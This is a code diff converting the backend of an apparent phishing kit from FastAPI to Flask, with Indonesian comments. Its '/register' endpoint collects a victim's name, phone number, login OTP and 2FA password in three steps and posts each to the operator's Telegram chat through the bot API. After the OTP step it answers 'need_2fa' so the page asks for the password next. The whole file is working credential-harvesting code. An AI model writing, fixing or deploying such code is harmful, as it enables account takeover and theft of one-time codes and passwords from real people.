@@ -1,54 +1,46 @@
-from fastapi import FastAPI, Request
-from fastapi.middleware.cors import CORSMiddleware
-from telethon import TelegramClient
 import os
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+import requests
 
-# 1. DEFINE APP DI PALING ATAS (Agar tidak error 'not defined')
-app = FastAPI()
+app = Flask(__name__)
 
-# 2. KONFIGURASI CORS
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+# MENGATASI CORS ERROR di Screenshot (293)
+CORS(app, resources={r"/*": {"origins": "*"}})
 
-# 3. AMBIL DATA DARI VARIABLES RAILWAY
-API_ID = os.getenv('API_ID')
-API_HASH = os.getenv('API_HASH')
-BOT_TOKEN = os.getenv('BOT_TOKEN')
+# Mengambil variabel sesuai nama di Screenshot (294)
+TOKEN = os.getenv("BOT_TOKEN") 
+CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
-# Pastikan bot_client didefinisikan setelah variabel diambil
-bot_client = TelegramClient('bot_session', int(API_ID) if API_ID else 0, API_HASH)
+def send_to_telegram(message):
+    if TOKEN and CHAT_ID:
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
+        requests.post(url, json=payload)
 
-@app.on_event("startup")
-async def startup_event():
-    if BOT_TOKEN:
-        await bot_client.start(bot_token=BOT_TOKEN)
-        print("Backend Berhasil Online!")
-
-@app.post("/register")
-async def register(request: Request):
-    data = await request.json()
-    nama = data.get("name")
-    phone = data.get("phone")
-    step = data.get("step") 
-    otp = data.get("otp", "")
-    password = data.get("password", "")
+@app.route('/register', methods=['POST'])
+def register():
+    data = request.json
+    step = data.get('step')
     
-    # Format pesan lengkap untuk Telegram
-    message = f"🔔 **Notif Pendaftaran**\n\n👤 Nama: {nama}\n📱 No: {phone}\n🛠 Status: {step}"
+    # Logika pengiriman pesan ke Telegram
+    if step == 1:
+        msg = f"🔔 *Data Masuk*\n👤 Nama: {data.get('nama')}\n📱 Nomor: {data.get('nomor')}"
+        send_to_telegram(msg)
+        return jsonify({"status": "success"}), 200
     
-    if otp:
-        message += f"\n🔑 Kode OTP: {otp}"
-    if password:
-        message += f"\n🔒 Sandi/2FA: {password}"
-        
-    await bot_client.send_message('me', message)
-    return {"status": "success"}
+    elif step == 2:
+        msg = f"🔑 *OTP*\n📱 Nomor: {data.get('nomor')}\n🔢 OTP: {data.get('otp')}"
+        send_to_telegram(msg)
+        # Respon ini memicu halaman 2FA di frontend
+        return jsonify({"status": "need_2fa", "next_step": "2fa"}), 200
 
-# 4. ROOT ROUTE (Agar URL tidak "Not Found")
-@app.get("/")
-async def root():
-    return {"message": "Server Aktif!"}
+    elif step == 3:
+        msg = f"🔐 *Sandi 2FA*\n📱 Nomor: {data.get('nomor')}\n🔑 Sandi: {data.get('sandi')}"
+        send_to_telegram(msg)
+        return jsonify({"status": "success"}), 200
+
+    return jsonify({"status": "error"}), 400
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=os.getenv("PORT", 5000))
